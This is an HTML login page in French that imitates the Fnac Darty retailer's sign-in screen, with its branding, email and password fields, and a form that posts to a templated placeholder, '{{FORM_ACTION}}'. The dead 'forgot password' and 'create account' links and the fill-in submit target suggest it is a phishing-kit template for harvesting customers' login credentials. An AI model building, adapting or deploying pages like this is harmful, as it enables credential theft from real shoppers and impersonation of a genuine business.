<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Fnac Darty</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'FnacDarty', 'Helvetica Neue', Arial, sans-serif; background: #fff; min-height: 100vh; color: #333; }
        .header { padding: 24px 5%; border-bottom: 1px solid #e5e5e5; }
        .logo { font-size: 1.8rem; font-weight: 800; }
        .logo .fnac { color: #e30613; }
        .logo .darty { color: #000; }
        .center { display: flex; justify-content: center; align-items: center; min-height: 70vh; padding: 40px; }
        .card { width: 100%; max-width: 420px; }
        h1 { font-size: 1.5rem; font-weight: 700; margin-bottom: 24px; color: #1a1a1a; }
        label { display: block; font-size: 0.9rem; font-weight: 600; margin-bottom: 8px; color: #333; }
        input { width: 100%; height: 48px; padding: 0 16px; margin-bottom: 20px; border: 1px solid #ccc; font-size: 16px; }
        input:focus { outline: none; border-color: #e30613; }
        button { width: 100%; height: 48px; background: #e30613; color: #fff; border: none; font-size: 16px; font-weight: 700; cursor: pointer; }
        button:hover { background: #c40511; }
        .links { margin-top: 20px; font-size: 14px; }
        .links a { color: #e30613; text-decoration: none; }
        .links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo"><span class="fnac">fnac</span><span class="darty">darty</span></div>
    </header>
    <div class="center">
        <div class="card">
            <h1>Connectez-vous à votre compte</h1>
            <form method="POST" action="{{FORM_ACTION}}">
                <label for="login">Adresse e-mail</label>
                <input type="text" id="login" name="login" placeholder="votre@email.com" required autocomplete="username">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
                <button type="submit">Se connecter</button>
            </form>
            <p class="links"><a href="#">Mot de passe oublié ?</a> · <a href="#">Créer un compte</a></p>
        </div>
    </div>
</body>
</html>
